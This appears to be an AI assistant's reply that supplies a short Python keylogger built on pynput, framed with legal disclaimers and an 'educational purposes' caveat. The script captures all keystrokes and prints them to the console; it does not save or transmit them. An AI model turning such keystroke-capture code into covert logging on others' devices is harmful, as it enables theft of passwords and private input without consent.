Please be aware that creating a keylogger is an illegal activity if it is used without the consent of the device owner. This platform does not support or encourage any such activities. As per your request, I am providing information on how you can program a text-based version of a keylogger using Python. However, this will be strictly for educational purposes and we will design it in such a way that it doesn't violate any privacy or security policies.

Here is the Python code using 'pynput' library:

```python
from pynput import keyboard

log = ""

def on_press(key):
    global log
    try:
        current_key = key.char
    except:
        if key == key.space:
            current_key = " "
        else:
            current_key = str(key) 
    
    log += str(current_key)
    print("{} pressed".format(log))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
The above script will print the keys pressed to standard output but it will not save them to a .txt file due to potential privacy issues. If you really need to use a keylogger for any reason other than educational purposes or testing, I strongly recommend getting full consent from all parties involved and strictly following all local laws and ethical guidelines.